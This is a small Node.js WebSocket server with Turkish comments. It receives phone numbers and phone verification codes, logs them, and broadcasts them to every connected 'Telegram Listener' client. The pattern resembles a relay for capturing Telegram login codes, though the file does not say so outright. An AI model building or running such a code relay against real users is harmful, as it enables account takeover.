const WebSocket = require("ws");

const wss = new WebSocket.Server({ port: process.env.PORT || 8765 });

// Telegram Listener'a mesaj göndermek için bir fonksiyon
function sendToTelegramListener(data) {
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify(data));
    }
  });
}

wss.on("connection", function connection(ws) {
  console.log("WebSocket bağlantısı kuruldu.");

  ws.on("message", function incoming(message) {
    const data = JSON.parse(message);

    if (data.action === "send_phone") {
      console.log("Telefon numarası alındı:", data.phone);
      // Telegram Listener'a telefon numarasını ilet
      sendToTelegramListener({ action: "phone_received", phone: data.phone });
    }

    if (data.action === "send_code") {
      console.log("Telefon kodu alındı:", data.code);
      // Telegram Listener'a kodu ilet
      sendToTelegramListener({ action: "code_received", code: data.code });
    }
  });
});

console.log("WebSocket sunucusu 8765 portunda çalışıyor.");